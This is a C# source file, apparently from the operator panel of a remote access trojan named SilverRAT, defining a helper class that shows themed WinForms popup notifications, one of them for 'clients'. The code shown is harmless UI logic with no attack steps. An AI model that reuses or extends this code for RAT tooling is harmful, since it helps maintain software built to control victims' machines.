using System.Drawing;
using System.Windows.Forms;

namespace SilverRAT.Helper;

public class Notifiecation
{
    public static PopupNotifier PopupNotifiection = new PopupNotifier();

    public static PopupNotifier ClientsNotifiection = new PopupNotifier();

    public static void Show(string title, string message, Image Icon, Color Themes)
    {
        Program.Silver.Invoke((MethodInvoker)delegate
        {




            PopupNotifiection = new PopupNotifier();

            PopupNotifiection.TitleText = title;
            PopupNotifiection.ContentText = message;
            PopupNotifiection.Delay = int.Parse(Settings.DelayNotif);

            if (Settings.ShowIconNotif)
            {
                PopupNotifiection.Image = Icon;
            }
            else
            {
                PopupNotifiection.Image = null;
            }
            PopupNotifiection.ShowCloseButton = Settings.CloseButtonNotif;
            PopupNotifiection.Scroll = Settings.ScrollToOutNotif;
            PopupNotifiection.GetFormTopColor = Themes;
            PopupNotifiection.GetFormBotomColor = Color.FromArgb(229, 229, 234);
            PopupNotifiection.TitlePadding = new Padding(2);
            PopupNotifiection.ContentPadding = new Padding(2);
            PopupNotifiection.ImagePadding = new Padding(5);
            PopupNotifiection.Popup();

        });
    }

    public static void Load(string title, string message, Image Icon, Color Themes)
    {
        Program.Silver.Invoke((MethodInvoker)delegate
        {
            lock (Settings.LockNotif)
            {
                ClientsNotifiection.TitleText = title;
                ClientsNotifiection.ContentText = message;
                ClientsNotifiection.Delay = int.Parse(Settings.DelayNotif);
                ClientsNotifiection.AnimationDuration = int.Parse(Settings.SpeedNotif);
                if (Settings.ShowIconNotif)
                {
                    ClientsNotifiection.Image = Icon;
                }
                else
                {
                    ClientsNotifiection.Image = null;
                }
                ClientsNotifiection.ShowCloseButton = Settings.CloseButtonNotif;
                ClientsNotifiection.Scroll = Settings.ScrollToOutNotif;
                ClientsNotifiection.GetFormTopColor = Themes;
                ClientsNotifiection.GetFormBotomColor = Color.FromArgb(229, 229, 234);
                ClientsNotifiection.TitlePadding = new Padding(2);
                ClientsNotifiection.ContentPadding = new Padding(2);
                ClientsNotifiection.ImagePadding = new Padding(5);
                ClientsNotifiection.Popup();
            }
        });
    }
}
